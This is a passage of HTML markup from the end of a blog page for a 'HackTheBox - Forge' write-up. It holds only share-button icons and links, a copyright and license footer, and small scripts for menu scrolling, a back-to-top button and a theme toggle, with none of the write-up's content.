24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Forge on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fforge%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Forge on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Forge%20-%20https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fforge%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Forge on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Forge&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fforge%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><div class=footer-wrapper><div class=footer-right><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span></div><div class=footer-mid><span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span>
&nbsp;·&nbsp;
<span class=support><a href=https://fahmifj.github.io/about#support>support</a></span>
&nbsp;·&nbsp;
<span class=rss><a href=https://fahmifj.github.io/index.xml>rss</a></span></div><div class=footer-left><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a></span></div></div></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.getElementsByClassName("profile-img")[0].addEventListener("click",()=>{location.href=location.origin+"/about"})</script></body></html>